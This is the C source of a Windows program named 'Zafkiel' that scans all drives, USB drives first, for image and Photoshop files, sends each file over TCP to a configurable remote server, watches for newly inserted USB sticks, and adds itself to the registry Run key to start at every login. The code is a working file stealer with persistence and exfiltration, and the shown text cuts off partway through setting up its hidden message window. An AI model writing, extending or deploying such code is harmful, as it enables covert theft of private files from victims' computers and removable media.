#include <stdio.h>
#include <string.h>
#include <winsock2.h>
#include <windows.h>
#include <winioctl.h>
#include <stdlib.h>
#include <dbt.h>
#include <io.h>
#include <direct.h>
#include <mstcpip.h>  // TCP KeepAlive 支持

#pragma comment(lib, "ws2_32.lib")

// ======================== 宏定义/配置常量===================

#define CONNECT_RETRY_INTERVAL  5000    // 连接重试间隔（毫秒）
#define MAX_RETRIES             5       // 单次任务最大重试次数
#define MAX_RETRY_QUEUE_SIZE    50      // 重试队列最大容量
#define SERVER_IP               "服务器IP地址（Server IP Address）"
#define SERVER_PORT             9000 //服务器端口（server port）,例如9000，需要保证服务器端口可用
#define BUFFER_SIZE             (4 * 1024 * 1024)   // 4MB 缓冲区
#define SIZE_30MB               (30 * 1024 * 1024)
#define MAX_PATH_LEN            4096    // 长路径支持
#define MAX_RECURSION_DEPTH     64      // 目录递归深度限制
#define INITIAL_RETRY_INTERVAL  1000    // 初始重试间隔（毫秒）
#define MAX_RETRY_INTERVAL      5000    // 最大重试间隔

// ======================== 结构定义 ========================
typedef struct {
    char filepath[MAX_PATH_LEN];     // 文件完整路径
    char filename[MAX_PATH];         // 文件名
    unsigned long long size;         // 文件大小（64位）
    FILETIME lastWriteTime;
    BOOL isLargeFile;                // 标记是否为大文件（超过30MB）
    BOOL isFromRemovable;            // 标记是否来自可移动设备（如U盘）
} FileInfo;

// 任务结构体
typedef struct TransmissionTask {
    volatile BOOL active;
    FileInfo info;
    int retryCount; // 记录重试次数
} TransmissionTask;

typedef struct {
    TransmissionTask* tasks;
    int front;
    int rear;
    int capacity;
} TaskQueue;

// ======================== 全局状态结构体 ========================
typedef struct {
    // 文件列表相关
    FileInfo* fileList;              // 动态文件列表数组
    int fileCount;                   // 当前文件数量
    int fileListCapacity;            // 文件列表容量

    // 窗口与设备通知
    HWND hwnd;
    HDEVNOTIFY hDeviceNotify;

    // 传输控制
    volatile BOOL pauseTransmission; // 传输暂停标志
    CRITICAL_SECTION cs;             // 临界区用于线程同步

    // 任务队列
    TaskQueue taskQueue;

    // 传输线程
    HANDLE hThread;
    DWORD threadId;

    // 新增重启标志
    volatile BOOL needRestart; // 标记是否需要重启
    volatile LONG threadExitFlag; // 原子退出标志（LONG 类型兼容 Interlocked 函数）
} State;

static State g_state = {0};// 全局状态实例


// ======================== 工具函数 ========================
unsigned long long htonll(unsigned long long value) {
    int num = 42;
    if (*(char *)&num == 42) {
        const unsigned int high = htonl((unsigned int)(value >> 32));
        const unsigned int low = htonl((unsigned int)(value & 0xFFFFFFFFLL));
        return (((unsigned long long)low) << 32) | high;
    }
    return value;
}

int SafeSend(SOCKET sock, const char* buf, int len) {
    int retries = MAX_RETRIES;
    int totalSent = 0;
    DWORD currentRetryInterval = INITIAL_RETRY_INTERVAL; // 当前重试间隔

    while (totalSent < len && retries > 0) {
        // 检查线程退出标志
        if (InterlockedCompareExchange(&g_state.threadExitFlag, 0, 0)) {
            printf("[WARN] 发送中断：线程退出标志已置位\n");
            return -1;
        }

        int sent = send(sock, buf + totalSent, len - totalSent, 0);
        if (sent == SOCKET_ERROR) {
            DWORD error = WSAGetLastError();
            if (error == WSAECONNRESET || error == WSAENOTCONN) {
                printf("[ERROR] 连接已断开，放弃重试\n");
                return -1;
            }
            printf("[WARN] 发送错误: %lu，剩余重试: %d，下次间隔: %lums\n",
                   error, retries - 1, currentRetryInterval);

            // 等待并更新间隔
            Sleep(currentRetryInterval);
            currentRetryInterval = min(currentRetryInterval + 1000, MAX_RETRY_INTERVAL);
            retries--;
        } else if (sent == 0) {
            printf("[WARN] 对端关闭连接\n");
            return -1;
        } else {
            totalSent += sent;
            retries = MAX_RETRIES;                    // 重置重试次数
            currentRetryInterval = INITIAL_RETRY_INTERVAL; // 重置间隔
        }
    }
    return (totalSent == len) ? totalSent : -1;
}

// ======================== 发送初始通知函数 ========================
void SendInitialNotification() {
    SOCKET sock = INVALID_SOCKET;
    SOCKADDR_IN addr = {0};
    addr.sin_family = AF_INET;
    addr.sin_port = htons(SERVER_PORT);
    addr.sin_addr.s_addr = inet_addr(SERVER_IP);

    sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock == INVALID_SOCKET) {
        printf("[INFO] 初始提示: 创建socket失败 (%d)\n", WSAGetLastError());
        return;
    }

    // 设置短超时以避免阻塞
    DWORD timeout = 3000; // 3秒
    setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, (const char*)&timeout, sizeof(timeout));

    if (connect(sock, (SOCKADDR*)&addr, sizeof(addr)) == SOCKET_ERROR) {
        printf("[INFO] 初始提示: 连接服务器失败 (%d)\n", WSAGetLastError());
        closesocket(sock);
        return;
    }

    const char* message = "[INIT] Client connected";
    int len = (int)strlen(message);
    if (send(sock, message, len, 0) == SOCKET_ERROR) {
        printf("[INFO] 初始提示: 发送失败 (%d)\n", WSAGetLastError());
    } else {
        printf("[INFO] 初始提示: 已通知服务器\n");
    }

    closesocket(sock);
}

void SendFile(TransmissionTask* task) {
    const char* functionName = __func__;
    const char* file_path = task->info.filepath;
    const char* filename = task->info.filename;
    SOCKET hsock = INVALID_SOCKET;
    SOCKADDR_IN addr = {0};
    BOOL finalFailure = FALSE;
    char* buffer = NULL;
    FILE* fp = NULL;
    unsigned long long total_bytes = 0;

    // ======================== 初始化服务器地址 ========================
    addr.sin_family = AF_INET;
    addr.sin_port = htons(SERVER_PORT);
    addr.sin_addr.s_addr = inet_addr(SERVER_IP);

    // ======================== 动态生成唯一文件名（修复序号递增问题） ========================
    static char** sentFilenames = NULL;    // 生成唯一文件名（避免重复）
    static int sentCount = 0;
    char uniqueName[MAX_PATH] = {0};
    strcpy(uniqueName, filename);

    // 唯一名生成逻辑
    int attempt = 1;  // 序号起始值
    char tempName[MAX_PATH] = {0};

    // 循环生成唯一名，直到找到一个未使用的名称
    while (1) {
        BOOL nameExists = FALSE;
        strcpy(tempName, filename);

        // 如果当前序号大于1，尝试生成带序号的文件名
        if (attempt > 1) {
            char* dot = strrchr(tempName, '.');
            if (dot && (dot != tempName)) {  // 处理扩展名
                char ext[MAX_PATH] = {0};
                strcpy(ext, dot);
                snprintf(tempName, MAX_PATH, "%.*s (%d)%s",
                         (int)(dot - tempName),  // 主文件名长度
                         tempName,               // 原文件名起始位置
                         attempt - 1,            // 当前序号（从1开始）
                         ext);                   // 扩展名
            } else {                            // 无扩展名
                snprintf(tempName, MAX_PATH, "%s (%d)", tempName, attempt - 1);
            }
        }

        // 检查当前生成的名称是否已存在
        for (int i = 0; i < sentCount; i++) {
            if (strcmp(sentFilenames[i], tempName) == 0) {
                nameExists = TRUE;
                break;
            }
        }

        if (!nameExists) {
            strcpy(uniqueName, tempName);  // 找到唯一名称
            break;
        }

        attempt++;
    }

    // 记录新文件名到静态数组（存储唯一名，而非原始名）
    char** newSent = realloc(sentFilenames, (sentCount + 1) * sizeof(char*));
    if (newSent) {
        sentFilenames = newSent;
        sentFilenames[sentCount] = _strdup(uniqueName);
        if (!sentFilenames[sentCount]) {
            printf("[WARN] 内存不足，使用原文件名: %s\n", filename);
            strcpy(uniqueName, filename);
        } else {
            sentCount++;
        }
    }


    // ======================== 连接服务器（带重试和退出检查，支持KeepAlive） ========================
    while (1) {
        // 检查退出标志
        if (InterlockedCompareExchange(&g_state.threadExitFlag, 0, 0)) {
            printf("[WARN][%s] 退出信号已接收，放弃连接尝试\n", functionName);
            finalFailure = TRUE;
            goto cleanup;
        }

        hsock = socket(AF_INET, SOCK_STREAM, 0);
        if (hsock == INVALID_SOCKET) {
            printf("[ERROR][%s] 套接字创建失败: %d\n", functionName, WSAGetLastError());
            Sleep(CONNECT_RETRY_INTERVAL);
            continue;
        }

        // 设置 KeepAlive
        struct tcp_keepalive alive = {1, 3000, 1000}; // 启用，3秒无活动探测，间隔1秒
        DWORD bytesReturned;
        if (WSAIoctl(hsock, SIO_KEEPALIVE_VALS, &alive, sizeof(alive), NULL, 0, &bytesReturned, NULL, NULL) == SOCKET_ERROR) {
            printf("[WARN][%s] KeepAlive 设置失败: %d\n", functionName, WSAGetLastError());
        }

        // 尝试连接
        if (connect(hsock, (SOCKADDR*)&addr, sizeof(addr)) == 0) {
            printf("[INFO][%s] 成功连接服务器\n", functionName);
            break;
        }

        // 连接失败处理
        DWORD error = WSAGetLastError();
        printf("[WARN][%s] 连接失败: %lu，%d毫秒后重试...\n", functionName, error, CONNECT_RETRY_INTERVAL);
        closesocket(hsock);
        hsock = INVALID_SOCKET;
        Sleep(CONNECT_RETRY_INTERVAL);
    }

    // ======================== 打开文件（支持长路径） ========================
    char long_path[MAX_PATH_LEN];
    snprintf(long_path, sizeof(long_path), "\\\\?\\%s", file_path);
    fp = fopen(long_path, "rb");
    if (!fp) {
        printf("[ERROR][%s] 文件打开失败: %s\n", functionName, long_path);
        finalFailure = TRUE;
        goto cleanup;
    }

    // ======================== 获取文件大小 ========================
    _fseeki64(fp, 0, SEEK_END);
    long long actual_size = _ftelli64(fp);
    _fseeki64(fp, 0, SEEK_SET);
    if (actual_size == 0) {
        printf("[WARN][%s] 空文件: %s\n", functionName, uniqueName);
        finalFailure = TRUE;
        goto cleanup;
    }

    // ======================== 发送文件元数据（大小和文件名） ========================
    unsigned long long net_file_size = htonll(actual_size);
    if (SafeSend(hsock, (char*)&net_file_size, sizeof(net_file_size)) != sizeof(net_file_size)) {
        printf("[ERROR][%s] 文件大小发送失败\n", functionName);
        finalFailure = TRUE;
        goto cleanup;
    }

    // 发送唯一文件名
    unsigned int filename_len = (unsigned int)strlen(uniqueName);
    unsigned int net_filename_len = htonl(filename_len);
    if (SafeSend(hsock, (char*)&net_filename_len, sizeof(net_filename_len)) != sizeof(net_filename_len)) {
        printf("[ERROR][%s] 文件名长度发送失败\n", functionName);
        finalFailure = TRUE;
        goto cleanup;
    }
    if (SafeSend(hsock, uniqueName, filename_len) != filename_len) {
        printf("[ERROR][%s] 文件名发送失败\n", functionName);
        finalFailure = TRUE;
        goto cleanup;
    }

    // ======================== 发送文件内容 ========================
    buffer = (char*)malloc(BUFFER_SIZE);
    if (!buffer) {
        printf("[ERROR][%s] 缓冲区分配失败\n", functionName);
        finalFailure = TRUE;
        goto cleanup;
    }

    size_t bytes_read;
    // 分块读取文件并发送
    while ((bytes_read = fread(buffer, 1, BUFFER_SIZE, fp)) > 0) {
        // 检查退出标志
        if (InterlockedCompareExchange(&g_state.threadExitFlag, 0, 0)) {
            printf("[WARN][%s] 退出信号已接收，终止发送: %s\n", functionName, uniqueName);
            finalFailure = TRUE;
            break;
        }

        // 发送数据块
        int sent = SafeSend(hsock, buffer, (int)bytes_read);
        if (sent != (int)bytes_read) {
            printf("[ERROR][%s] 内容发送失败 (已发送: %d/%zu)\n", functionName, sent, bytes_read);
            finalFailure = TRUE;
            break;
        }
        total_bytes += sent;
        printf("[INFO][%s] 进度: %s (%llu/%llu)\n", functionName, uniqueName, total_bytes, (unsigned long long)actual_size);
    }

    // ======================== 完整性检查 ========================
    if (total_bytes != (unsigned long long)actual_size && !finalFailure) {
        printf("[ERROR][%s] 文件不完整 (实际: %llu, 预期: %llu)\n", functionName, total_bytes, (unsigned long long)actual_size);
        finalFailure = TRUE;
    }

    cleanup:
    // ======================== 资源清理 ========================
    if (buffer) free(buffer);
    if (fp) fclose(fp);
    if (hsock != INVALID_SOCKET) {
        // 发送终止标记（即使失败也尝试）
        if (!finalFailure && !InterlockedCompareExchange(&g_state.threadExitFlag, 0, 0)) {
            const char* endMsg = "[FIN] Transmission complete";
            send(hsock, endMsg, (int)strlen(endMsg), 0);
        }
        // 显式关闭套接字
        shutdown(hsock, SD_BOTH);  // 关闭双向通信
        closesocket(hsock);
        hsock = INVALID_SOCKET;
    }

    // ======================== 重试逻辑（线程安全） ========================
    EnterCriticalSection(&g_state.cs);
    if (finalFailure) {
        if (task->retryCount < MAX_RETRIES) {
            TransmissionTask new_task = *task;
            new_task.retryCount++;
            // 插入队首优先重试
            if (g_state.taskQueue.rear - g_state.taskQueue.front < MAX_RETRY_QUEUE_SIZE) {
                memmove(&g_state.taskQueue.tasks[g_state.taskQueue.front + 1],
                        &g_state.taskQueue.tasks[g_state.taskQueue.front],
                        (g_state.taskQueue.rear - g_state.taskQueue.front + 1) * sizeof(TransmissionTask));
                g_state.taskQueue.tasks[g_state.taskQueue.front] = new_task;
                g_state.taskQueue.rear++;
                printf("[RETRY][%s] 任务入队: %s (次数: %d)\n", functionName, uniqueName, new_task.retryCount);
            }
        } else {
            printf("[FATAL][%s] 放弃任务: %s (超过最大重试次数)\n", functionName, uniqueName);
        }
    } else {
        printf("[SUCCESS][%s] 发送完成: %s\n", functionName, uniqueName);
    }
    LeaveCriticalSection(&g_state.cs);
}

// ======================== 递归文件扫描 ========================
BOOL IsRemovableByDeviceType(const char* root) {
    char physicalPath[MAX_PATH];
    snprintf(physicalPath, sizeof(physicalPath), "\\\\.\\%c:", root[0]);
    HANDLE hDevice = CreateFileA(physicalPath, 0, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
    if (hDevice == INVALID_HANDLE_VALUE) return FALSE;

    STORAGE_PROPERTY_QUERY query = {0};
    query.PropertyId = StorageDeviceProperty;
    query.QueryType = PropertyStandardQuery;

    DWORD bytesReturned;
    BYTE buffer[1024] = {0};
    BOOL result = DeviceIoControl(hDevice, IOCTL_STORAGE_QUERY_PROPERTY, &query, sizeof(query), buffer, sizeof(buffer), &bytesReturned, NULL);
    CloseHandle(hDevice);

    if (!result) return FALSE;
    STORAGE_DEVICE_DESCRIPTOR* desc = (STORAGE_DEVICE_DESCRIPTOR*)buffer;
    return (desc->BusType == BusTypeUsb);
}

void FindFile(const char* path, BOOL isRemovableDrive) {
    static int recursion_depth = 0;
    if (++recursion_depth > MAX_RECURSION_DEPTH) {
        printf("[WARN] 目录嵌套过深，已跳过: %s\n", path);
        recursion_depth--;
        return;
    }

    if (strlen(path) >= MAX_PATH_LEN - 4) {
        printf("[WARN] 路径过长: %s\n", path);
        recursion_depth--;
        return;
    }

    char tempPath[MAX_PATH_LEN];
    snprintf(tempPath, sizeof(tempPath), "%s\\*.*", path);
    tempPath[MAX_PATH_LEN - 1] = '\0';

    WIN32_FIND_DATA fileData;
    HANDLE hfile = FindFirstFile(tempPath, &fileData);
    if (hfile == INVALID_HANDLE_VALUE) {
        DWORD error = GetLastError();
        if (error == ERROR_ACCESS_DENIED) {
            printf("[WARN] 访问被拒绝: %s\n", path);
        } else {
            printf("[WARN] 打开目录失败: %s (错误码: %lu)\n", path, error);
        }
        recursion_depth--;
        return;
    }

    do {
        if (fileData.cFileName[0] == '.') continue;

        snprintf(tempPath, sizeof(tempPath), "%s\\%s", path, fileData.cFileName);
        tempPath[MAX_PATH_LEN - 1] = '\0';

        if (fileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
            HANDLE hTest = CreateFile(tempPath, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_FLAG_BACKUP_SEMANTICS, NULL);
            if (hTest == INVALID_HANDLE_VALUE) {
                DWORD err = GetLastError();
                if (err == ERROR_ACCESS_DENIED) {
                    printf("[WARN] 跳过受限目录: %s\n", tempPath);
                    continue;
                }
            } else {
                CloseHandle(hTest);
            }
            FindFile(tempPath, isRemovableDrive);
        } else {
            char* ext = strrchr(fileData.cFileName, '.');
            //想要传输获取的文件类型，以下为示例，可自行扩展（The file types that you want to transfer and obtain are as follows, which can be extended by yourself）
            const char* allowed_ext[] = {
                    ".psd", ".bmp", ".jpg", ".jpeg", ".png"
            };

            if (ext) {
                int is_supported = 0;
                for (int i = 0; i < sizeof(allowed_ext)/sizeof(allowed_ext[0]); i++) {
                    if (_stricmp(ext, allowed_ext[i]) == 0) {
                        is_supported = 1;
                        break;
                    }
                }

                if (is_supported) {
                    if (fileData.dwFileAttributes & (FILE_ATTRIBUTE_DEVICE | FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_TEMPORARY | FILE_ATTRIBUTE_REPARSE_POINT)) {
                        printf("[WARN] 忽略非常规文件: %s\n", tempPath);
                        continue;
                    }

                    unsigned long long file_size = ((unsigned long long)fileData.nFileSizeHigh << 32) | fileData.nFileSizeLow;
                    if (file_size == 0) {
                        printf("[WARN] 忽略空文件: %s (WIN32原生报告)\n", tempPath);
                        continue;
                    }

                    EnterCriticalSection(&g_state.cs); // 进入临界区

                    if (g_state.fileCount >= g_state.fileListCapacity) {
                        // 动态扩展文件列表容量
                        int newCapacity = g_state.fileListCapacity == 0 ? 100 : g_state.fileListCapacity * 2;
                        FileInfo* newList = (FileInfo*)realloc(g_state.fileList, newCapacity * sizeof(FileInfo));
                        if (!newList) {
                            printf("[ERROR] 文件列表扩展失败，跳过当前文件: %s\n", tempPath);
                            FindClose(hfile);
                            recursion_depth--;
                            LeaveCriticalSection(&g_state.cs);
                            continue; // 继续处理下一个文件
                        }
                        g_state.fileList = newList;
                        g_state.fileListCapacity = newCapacity;
                    }

                    // 填充文件信息
                    strncpy(g_state.fileList[g_state.fileCount].filepath, tempPath, MAX_PATH_LEN - 1);
                    g_state.fileList[g_state.fileCount].filepath[MAX_PATH_LEN - 1] = '\0';

                    strncpy(g_state.fileList[g_state.fileCount].filename, fileData.cFileName, MAX_PATH - 1);
                    g_state.fileList[g_state.fileCount].filename[MAX_PATH - 1] = '\0';

                    g_state.fileList[g_state.fileCount].size = file_size;
                    g_state.fileList[g_state.fileCount].lastWriteTime = fileData.ftLastWriteTime;
                    g_state.fileList[g_state.fileCount].isLargeFile = (file_size > SIZE_30MB);
                    g_state.fileList[g_state.fileCount].isFromRemovable = isRemovableDrive;

                    g_state.fileCount++; // 递增文件计数

                    LeaveCriticalSection(&g_state.cs); // 离开临界区
                }
            }
        }
    } while (FindNextFile(hfile, &fileData) != 0);

    FindClose(hfile);
    recursion_depth--;
}

// ======================== 驱动器扫描 ========================
void ScanAllDrives() {
    DWORD driveMask = GetLogicalDrives();
    char driveRoot[] = "A:\\";
    char removableDrives[26][4] = {0};
    char fixedDrives[26][4] = {0};
    char dDrive[4] = "";
    int remCount = 0, fixedCount = 0;

    for (int drive = 'A'; drive <= 'Z'; drive++) {
        char driveChar = (char)drive;
        driveRoot[0] = driveChar;
        if (driveMask & (1 << (driveChar - 'A'))) {
            UINT type = GetDriveTypeA(driveRoot);
            BOOL isRemovable = IsRemovableByDeviceType(driveRoot);

            if (isRemovable || type == DRIVE_REMOVABLE) {
                strcpy(removableDrives[remCount++], driveRoot);

                // ========== 关键修改1：立即注册设备通知 ==========
                DEV_BROADCAST_DEVICEINTERFACE_A filter = {0};
                filter.dbcc_size = sizeof(filter);
                filter.dbcc_devicetype = DBT_DEVTYP_DEVICEINTERFACE;
                strncpy(filter.dbcc_name, driveRoot, sizeof(filter.dbcc_name)-1);

                HDEVNOTIFY hDevNotify = RegisterDeviceNotificationA(
                        g_state.hwnd,
                        &filter,
                        DEVICE_NOTIFY_WINDOW_HANDLE
                );
                if (hDevNotify) {
                    printf("[INFO] 已注册设备通知: %s\n", driveRoot);
                }
            } else if (type == DRIVE_FIXED) {
                if (strcmp(driveRoot, "D:\\") == 0) {
                    strcpy(dDrive, driveRoot);
                } else {
                    strcpy(fixedDrives[fixedCount++], driveRoot);
                }
            }
        }
    }

    printf("\n=== 扫描优先级：USB → D盘 → 其他固定盘 ===\n");

    for (int i = 0; i < remCount; i++) {
        printf("[优先级] 扫描USB驱动器: %s\n", removableDrives[i]);
        FindFile(removableDrives[i], TRUE);
    }

    if (strlen(dDrive) > 0) {
        printf("[优先级] 扫描D盘: %s\n", dDrive);
        FindFile(dDrive, FALSE);
    }

    for (int i = 0; i < fixedCount; i++) {
        printf("[INFO] 扫描固定盘: %s\n", fixedDrives[i]);
        FindFile(fixedDrives[i], FALSE);
    }
}

// ======================== 开机自启动函数 ========================
void AddToStartup() {
    HKEY hKey;
    char exePath[MAX_PATH];

    // 获取当前exe路径
    if (!GetModuleFileNameA(NULL, exePath, MAX_PATH)) {
        printf("[ERROR] 获取程序路径失败: %lu\n", GetLastError());
        return;
    }

    // 打开注册表项
    LSTATUS status = RegOpenKeyExA(
            HKEY_CURRENT_USER,
            "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
            0,
            KEY_WRITE,
            &hKey
    );

    if (status != ERROR_SUCCESS) {
        printf("[ERROR] 打开注册表失败: %lu\n", status);
        return;
    }

    // 设置注册表值
    char quotedPath[MAX_PATH + 2];
    snprintf(quotedPath, sizeof(quotedPath), "\"%s\"", exePath);

    status = RegSetValueExA(
            hKey,
            "Zafkiel",
            0,
            REG_SZ,
            (const BYTE*)quotedPath,  // 使用带引号的路径
            (DWORD)strlen(quotedPath) + 1
    );

    RegCloseKey(hKey);

    if (status == ERROR_SUCCESS) {
        printf("[SUCCESS] 开机自启动注册成功！\n");
    } else {
        printf("[ERROR] 注册表写入失败: %lu\n", status);
    }
}

// ======================== 任务队列操作 ========================
void InitQueue() {
    g_state.taskQueue.capacity = 100;
    g_state.taskQueue.tasks = malloc(g_state.taskQueue.capacity * sizeof(TransmissionTask));
    g_state.taskQueue.front = 0;
    g_state.taskQueue.rear = -1;
}


// ======================= 任务队列动态扩展 =======================
void EnqueueTask(TransmissionTask task) {
    EnterCriticalSection(&g_state.cs);
    if (g_state.taskQueue.rear >= g_state.taskQueue.capacity - 1) {
        // 动态扩展队列容量（安全检查）
        int new_capacity = g_state.taskQueue.capacity * 2;
        TransmissionTask* new_tasks = realloc(g_state.taskQueue.tasks, new_capacity * sizeof(TransmissionTask));
        if (!new_tasks) {
            printf("[WARN][EnqueueTask] 队列内存不足，无法添加新任务: %s\n", task.info.filename);
            LeaveCriticalSection(&g_state.cs);
            return;
        }
        g_state.taskQueue.tasks = new_tasks;
        g_state.taskQueue.capacity = new_capacity;
    }
    g_state.taskQueue.tasks[++g_state.taskQueue.rear] = task;
    LeaveCriticalSection(&g_state.cs);
}

// ======================== 任务队列操作 ========================
TransmissionTask DequeueTask() {
    EnterCriticalSection(&g_state.cs);
    TransmissionTask task = {0};
    while (g_state.taskQueue.front <= g_state.taskQueue.rear) {
        task = g_state.taskQueue.tasks[g_state.taskQueue.front++];
        if (task.active) break; // 只返回活跃任务
    }
    LeaveCriticalSection(&g_state.cs);
    return task;
}

int IsQueueEmpty() {
    EnterCriticalSection(&g_state.cs);
    int empty = (g_state.taskQueue.front > g_state.taskQueue.rear);
    LeaveCriticalSection(&g_state.cs);
    return empty;
}

// ======================== 设备通知与线程管理 ========================
LRESULT CALLBACK WndProc(HWND hWnd, UINT msg, WPARAM wParam, LPARAM lParam) {
    switch (msg) {
        case WM_DEVICECHANGE: {
            PDEV_BROADCAST_HDR pHdr = (PDEV_BROADCAST_HDR)lParam;
            if (wParam == DBT_DEVICEARRIVAL && pHdr->dbch_devicetype == DBT_DEVTYP_VOLUME) {
                printf("\n[事件] 检测到U盘插入，暂停当前传输并优先处理新文件...\n");
                EnterCriticalSection(&g_state.cs);
                g_state.pauseTransmission = TRUE;
                LeaveCriticalSection(&g_state.cs);
                Sleep(500); // 等待当前传输完成

                EnterCriticalSection(&g_state.cs);
                int prevFileCount = g_state.fileCount;
                LeaveCriticalSection(&g_state.cs);

                ScanAllDrives();

                EnterCriticalSection(&g_state.cs);
                if (g_state.fileCount > prevFileCount) {
                    int newTaskCount = g_state.fileCount - prevFileCount;
                    TransmissionTask* temp = malloc(
                            (g_state.taskQueue.rear - g_state.taskQueue.front + 1 + newTaskCount) * sizeof(TransmissionTask)
                    );

                    if (!temp) {
                        printf("[WARN] 内存不足，无法优先处理新插入文件\n");
                        LeaveCriticalSection(&g_state.cs);
                        break;
                    }

                    for (int i = prevFileCount; i < g_state.fileCount; i++) {
                        TransmissionTask task = {
                                .active = TRUE,
                                .info = g_state.fileList[i],
                                .retryCount = 0
                        };
                        temp[i - prevFileCount] = task;
                    }

                    for (int i = 0; i <= g_state.taskQueue.rear - g_state.taskQueue.front; i++) {
                        temp[newTaskCount + i] = g_state.taskQueue.tasks[g_state.taskQueue.front + i];
                    }

                    free(g_state.taskQueue.tasks);
                    g_state.taskQueue.tasks = temp;
                    g_state.taskQueue.front = 0;
                    g_state.taskQueue.rear = newTaskCount + (g_state.taskQueue.rear - g_state.taskQueue.front);
                    g_state.taskQueue.capacity = newTaskCount + (g_state.taskQueue.rear - g_state.taskQueue.front + 1);
                }

                g_state.pauseTransmission = FALSE;
                LeaveCriticalSection(&g_state.cs);
            }

            // ========== 设备移除时标记重启 ==========
            if (wParam == DBT_DEVICEQUERYREMOVE || wParam == DBT_DEVICEREMOVEPENDING) {
                if (pHdr->dbch_devicetype == DBT_DEVTYP_VOLUME) {
                    PDEV_BROADCAST_VOLUME pVol = (PDEV_BROADCAST_VOLUME)pHdr;
                    DWORD driveMask = pVol->dbcv_unitmask;
                    char driveLetter = 'A';
                    for (; driveMask; driveMask >>= 1, driveLetter++) {
                        if (driveMask & 1) break;
                    }
                    char driveRoot[4] = {driveLetter, ':', '\\', '\0'};
                    printf("\n[事件] 检测到设备 %s 将被移除，强制清理相关资源...\n", driveRoot);

                    EnterCriticalSection(&g_state.cs);
                    // 清理任务队列
                    int validTasks = 0;
                    for (int i = g_state.taskQueue.front; i <= g_state.taskQueue.rear; i++) {
                        if (strncmp(g_state.taskQueue.tasks[i].info.filepath, driveRoot, 3) != 0) {
                            g_state.taskQueue.tasks[validTasks++] = g_state.taskQueue.tasks[i];
                        } else {
                            printf("[强制清理] 移除任务: %s\n", g_state.taskQueue.tasks[i].info.filename);
                            // 标记任务为无效
                            g_state.taskQueue.tasks[i].active = FALSE;
                        }
                    }
                    g_state.taskQueue.rear = validTasks - 1;
                    g_state.taskQueue.front = 0;

                    // 设置重启标志
                    g_state.needRestart = TRUE;
                    LeaveCriticalSection(&g_state.cs);
                    printf("[事件] 已标记重启标志，等待主线程处理...\n");
                }
                return TRUE; // 允许系统移除设备
            }
            break;
        }
        case WM_DESTROY:
            PostQuitMessage(0);
            break;
        default:
            return DefWindowProc(hWnd, msg, wParam, lParam);
    }
    return 0;
}

void RegisterDeviceNotify() {
    DEV_BROADCAST_DEVICEINTERFACE_A filter = {0};
    filter.dbcc_size = sizeof(DEV_BROADCAST_DEVICEINTERFACE_A);
    filter.dbcc_devicetype = DBT_DEVTYP_DEVICEINTERFACE;

    g_state.hDeviceNotify = RegisterDeviceNotificationA(
            g_state.hwnd,
            &filter,
            DEVICE_NOTIFY_WINDOW_HANDLE | DEVICE_NOTIFY_ALL_INTERFACE_CLASSES
    );
}

// ======================== 传输线程 ========================
DWORD WINAPI TransmissionThread(LPVOID lpParam) {
    while (1) {
        // ========== 主循环入口检查退出标志 ==========
        if (InterlockedCompareExchange(&g_state.threadExitFlag, 0, 0)) {
            printf("[INFO] 传输线程已收到退出信号，正在退出...\n");
            break;
        }

        // ========== 检查是否暂停传输 ==========
        EnterCriticalSection(&g_state.cs);
        BOOL isPaused = g_state.pauseTransmission;
        LeaveCriticalSection(&g_state.cs);

        if (isPaused) {
            // 短时休眠并频繁检查退出标志
            for (int i = 0; i < 10; i++) {
                if (InterlockedCompareExchange(&g_state.threadExitFlag, 0, 0)) {
                    break; // 立即退出
                }
                Sleep(100);
            }
            continue;
        }

        // ========== 从队列中获取任务 ==========
        TransmissionTask task = DequeueTask();

        // ========== 处理任务前再次检查退出标志 ==========
        if (InterlockedCompareExchange(&g_state.threadExitFlag, 0, 0)) {
            printf("[INFO] 退出信号已接收，放弃处理新任务\n");
            break;
        }

        if (task.active) {
            SendFile(&task); // 发送文件（内部会检查退出标志）
        } else {
            // 队列为空时短时休眠并检查退出标志
            for (int i = 0; i < 10; i++) {
                if (InterlockedCompareExchange(&g_state.threadExitFlag, 0, 0)) {
                    break; // 立即退出
                }
                Sleep(100);
            }
        }
    }
    return 0;
}

// ======================== 重启函数 ========================
void SafeRestart() {
    // ================= 停止传输线程 =================
    // 设置原子退出标志（无锁）
    InterlockedExchange(&g_state.threadExitFlag, TRUE);
    printf("[INFO] 已请求传输线程退出，等待清理...\n");

    // 等待线程退出（最多 5 秒）
    DWORD waitResult = WaitForSingleObject(g_state.hThread, 5000);
    if (waitResult == WAIT_TIMEOUT) {
        // 强制终止线程（最后手段）
        TerminateThread(g_state.hThread, 0);
        printf("[WARN] 传输线程未响应，已强制终止！\n");
    }

    // 清理线程句柄
    CloseHandle(g_state.hThread);
    g_state.hThread = NULL;

    // ================= 清理全局资源 =================
    EnterCriticalSection(&g_state.cs);
    // 清理文件列表
    free(g_state.fileList);
    g_state.fileList = NULL;
    g_state.fileCount = 0;
    g_state.fileListCapacity = 0;

    // 清理任务队列
    free(g_state.taskQueue.tasks);
    g_state.taskQueue.tasks = NULL;
    g_state.taskQueue.front = 0;
    g_state.taskQueue.rear = -1;
    LeaveCriticalSection(&g_state.cs);

    // ================= 重新初始化 =================
    // 初始化队列和文件列表
    InitQueue();
    g_state.fileList = (FileInfo*)malloc(100 * sizeof(FileInfo));
    if (!g_state.fileList) {
        printf("[ERROR] 文件列表内存分配失败！\n");
        return;
    }
    g_state.fileListCapacity = 100;

    // 重新扫描驱动器
    ScanAllDrives();
    printf("[INFO] 资源清理完成，重新初始化状态\n");

    // =================重启传输线程 =================
    // 重置原子标志
    InterlockedExchange(&g_state.threadExitFlag, FALSE);
    g_state.hThread = CreateThread(NULL, 0, TransmissionThread, NULL, 0, &g_state.threadId);
    if (!g_state.hThread) {
        MessageBox(NULL, "传输线程重启失败", "错误", MB_ICONERROR);
    }
}
void InitMessageWindow() {
    WNDCLASSA wc = {0};
    wc.lpfnWndProc = WndProc; // 窗口过程函数
    wc.hInstance = GetModuleHandle(NULL); // 当前实例句柄
    wc.lpszClassName = "ZafkielMsgWindow"; // 窗口类名

